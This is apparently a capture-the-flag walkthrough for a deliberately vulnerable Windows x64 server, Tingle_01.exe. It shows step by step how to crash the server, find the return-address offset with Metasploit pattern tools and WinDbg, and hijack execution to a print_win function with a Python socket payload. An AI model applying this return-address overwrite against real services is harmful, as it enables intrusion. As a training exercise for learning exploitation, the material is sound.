# Tingle's Basic x64 Stack Overflower

## You have one goal:
#### Print the flag without modifying the server.

<details>
	<summary>Spoilers</summary>

## Step one:
#### Get a crash
Run Tingle_01.exe in a WindDbg or set WinDbg as your postmortem debugger.

<details>

[WinDbg Cheat Sheet](https://blog.lamarranet.com/wp-content/uploads/2021/09/WinDbg-Cheat-Sheet.pdf)

![Get Windbg](/WinDbgStore.PNG)

![Post Mortem Enable](/postmortem.PNG)

</details>

Send a bunch of bytes to the server.

```python
	sock.send(b"A" * 50)
```

<details>

![Crash](/AAAA.PNG)

</details>

You can see that we have written over the return address, causing an access violation.
This is because our program is trying to return to adress 0x4141414141414141, which is invalid.

(0x41 is the hex value for the ASCII letter "A")

## Step Two:
#### Figure out which A's are causing the return address overwrite.

You can get creative here or use tools.

I prefer to use tools.


<details>

[Metasploit-Framework](https://www.metasploit.com/)

[Kali Metasploit-Framework](https://www.kali.org/tools/metasploit-framework/)

<summary>msf-pattern_create and msf-pattern_offset</summary>

![Patterns](/Pattern.PNG)

</details>

We'll begin by running ```msf-pattern_create -l 1000```

<details>

![Pattern Create](/PatterCreate.PNG)

</details>


Then we'll change our python

From:
```python
sock.send(b"A" * 50)
```
To:
```python
sock.send(b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab")
```

And send it to the server.

<details>

![Pattern Bytes](/PatternBytes.PNG)

</Details>

You can see that we have now overwrote the return address with ```0x3562413462413362```

You can also see that I ran the Display pointer-size value and Symbols command ```dps rsp```

This command will print the value rsp is pointing to, so you can more easily copy it.

Finally wee run ```msf-pattern_offset -l 50 -q 3562413462413362```

<details>

![Pattern Offset](/PatternOffset.PNG)

</details>

Then we'll change our python

From:
```python
sock.send(b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab")
```
To:
```python
sock.send(b"A" * 40)
```

For now.

## Step Three:
#### Make the return address something fun.

Start Tingle_01.exe in WinDbg.

<details>

![Debug](/RunInDebug.PNG)

</details>

Enter ```lm``` into the command window prompt.

<details>

![ListModules](/TypeLM.PNG)

</details>

This command (List Modules) shows the modules that are loaded in our process.

We want to find the address of the ```print_win``` function.

So, we'll need to run Display Sybmols command ```x Tingle_01.exe!print_win``` in the WindDbg command prompt.

<details>

![Win Address](/WinAddr.PNG)

</details>

This command shows us the address of the function.

We need to copy that address for our and update our python.
From:
```python
sock.send(b"A" * 40)
```
To:
```python
sock.send(b"A" * 40 + struct.pack("<Q", 0x0000000140002190))
```

You can read up on struct here [Struct](https://docs.python.org/3/library/struct.html).

Here we are turning our ```0x0000000140002190``` address into a ```"<Q"``` little endian 8 byte bytestring so we can send it.

# Profit:

We can run Tingle_01.exe in WinDbg and set a bp on the ```vuln``` function by running the command ```bp Tingle_01!vuln``` in the command prompt.

<details>

![Set Bp](/SetBp.PNG)

</details>

Then we can change to assembly stepping from source stepping with the Step Source Options command ```l-t```.

Send our bytes with our python and once we hit our break point we can step down to the return instruction by

entering the step over instruction command ```p``` or the ```Step Over``` button in the top left a few times.

<details>

![Ret Instruction](/Ret.PNG)

</details>

We can once again runn ```x Tingle_01.exe!print_win``` and ```dps rsp``` to see the address of the print_win function and the address
at which we are going to return.

<details>

![Ret Where??](/ReturnToWhere.PNG)

</details>

You can see that we are about to return to the print_win function instead of main, where we were called from.

Runt the Go command ```g``` or press the ```Go``` button in the top left to continue execution.

Pull up the console for our server and...

![Yay](/Yay.PNG)

Though the server crashes in this case.

Wanna give it a go?

Compiling in debug will change the addresses, amongst other things. So, you can try to figure it out yourself.

</details>
